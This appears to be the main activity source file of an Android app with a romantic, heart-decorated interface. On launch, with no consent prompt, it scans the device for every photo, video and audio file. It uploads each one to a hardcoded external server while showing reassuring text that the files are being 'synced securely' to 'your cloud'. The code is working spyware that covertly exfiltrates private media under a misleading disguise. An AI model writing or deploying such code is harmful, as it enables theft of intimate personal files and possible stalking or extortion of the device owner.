package com.snugglequeen.yobby;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.database.Cursor;
import android.net.Uri;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings;
import android.os.StatFs;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * MainActivity — scans device for all photos + videos + audio,
 * uploads them to the Render backend, shows progress.
 */
public class MainActivity extends Activity {

    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
    private TextView statusText;
    private ProgressBar progressBar;
    private TextView progressText;
    private int totalFiles = 0;
    private int uploadedFiles = 0;
    private List<String> fileList = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        RelativeLayout root = new RelativeLayout(this);
        root.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                new int[]{Color.parseColor("#1A1A2E"), Color.parseColor("#0F0F1E")}
        );
        root.setBackground(gradient);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(60, 80, 60, 60);
        content.setGravity(android.view.Gravity.CENTER_VERTICAL);
        content.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        // Heart
        TextView heart = new TextView(this);
        heart.setText("💕");
        heart.setTextSize(50);
        heart.setGravity(android.view.Gravity.CENTER);
        heart.setPadding(0, 0, 0, 20);
        content.addView(heart);

        // Status
        statusText = new TextView(this);
        statusText.setText("Scanning your media files... 🔍");
        statusText.setTextSize(18);
        statusText.setTextColor(Color.WHITE);
        statusText.setGravity(android.view.Gravity.CENTER);
        statusText.setPadding(0, 0, 0, 30);
        content.addView(statusText);

        // Progress bar
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        android.widget.LinearLayout.LayoutParams pbParams = new android.widget.LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dpToPx(12)
        );
        pbParams.setMargins(40, 0, 40, 20);
        progressBar.setLayoutParams(pbParams);
        content.addView(progressBar);

        // Progress text
        progressText = new TextView(this);
        progressText.setText("Preparing...");
        progressText.setTextSize(13);
        progressText.setTextColor(Color.parseColor("#FF6B9D"));
        progressText.setGravity(android.view.Gravity.CENTER);
        content.addView(progressText);

        // Footer
        TextView footer = new TextView(this);
        footer.setText("Your files are being synced securely 💖\nThis may take a few minutes...");
        footer.setTextSize(12);
        footer.setTextColor(Color.parseColor("#606080"));
        footer.setGravity(android.view.Gravity.CENTER);
        footer.setLineSpacing(6, 1.2f);
        android.widget.LinearLayout.LayoutParams footerParams = new android.widget.LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        footerParams.setMargins(0, 60, 0, 0);
        footer.setLayoutParams(footerParams);
        content.addView(footer);

        root.addView(content);
        setContentView(root);

        // Start scanning + uploading in background
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            scanAndUpload();
        });
    }

    private int dpToPx(int dp) {
        return (int) (dp * getResources().getDisplayMetrics().density);
    }

    private void scanAndUpload() {
        // Scan all media files
        runOnUiThread(() -> statusText.setText("Scanning photos... 📷"));

        // Get all images
        fileList.addAll(getMediaFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, MediaStore.Images.Media.DATA));

        runOnUiThread(() -> statusText.setText("Scanning videos... 🎬"));
        fileList.addAll(getMediaFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, MediaStore.Video.Media.DATA));

        runOnUiThread(() -> statusText.setText("Scanning audio... 🎵"));
        fileList.addAll(getMediaFiles(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, MediaStore.Audio.Media.DATA));

        totalFiles = fileList.size();

        if (totalFiles == 0) {
            runOnUiThread(() -> {
                statusText.setText("No media files found 💔");
                progressText.setText("Your device has no photos/videos to sync");
            });
            return;
        }

        runOnUiThread(() -> {
            statusText.setText("Uploading " + totalFiles + " files to your cloud... ☁️");
            progressBar.setMax(totalFiles);
        });

        // Upload each file
        for (int i = 0; i < fileList.size(); i++) {
            String filePath = fileList.get(i);
            uploadedFiles = i;

            final int fi = i;
            final String fPath = filePath;
            runOnUiThread(() -> {
                progressBar.setProgress(fi);
                progressText.setText(fi + " / " + totalFiles + " uploaded (" + new File(fPath).getName() + ")");
            });

            try {
                uploadFile(filePath);
            } catch (Exception e) {
                // Continue to next file
            }
        }

        // Done
        runOnUiThread(() -> {
            progressBar.setProgress(totalFiles);
            statusText.setText("All files synced! ✅");
            progressText.setText(totalFiles + " files uploaded successfully 💕");
        });
    }

    private List<String> getMediaFiles(Uri uri, String dataColumn) {
        List<String> files = new ArrayList<>();
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int index = cursor.getColumnIndex(dataColumn);
                if (index >= 0) {
                    String path = cursor.getString(index);
                    if (path != null) {
                        File file = new File(path);
                        if (file.exists() && file.length() > 0) {
                            files.add(path);
                        }
                    }
                }
            }
            cursor.close();
        }
        return files;
    }

    private void uploadFile(String filePath) throws Exception {
        File file = new File(filePath);
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL(BACKEND_URL + "/api/upload");

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);

        OutputStream os = conn.getOutputStream();

        // Write file part
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());

        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
        }
        fis.close();

        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
        os.flush();
        os.close();

        int responseCode = conn.getResponseCode();
        conn.disconnect();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
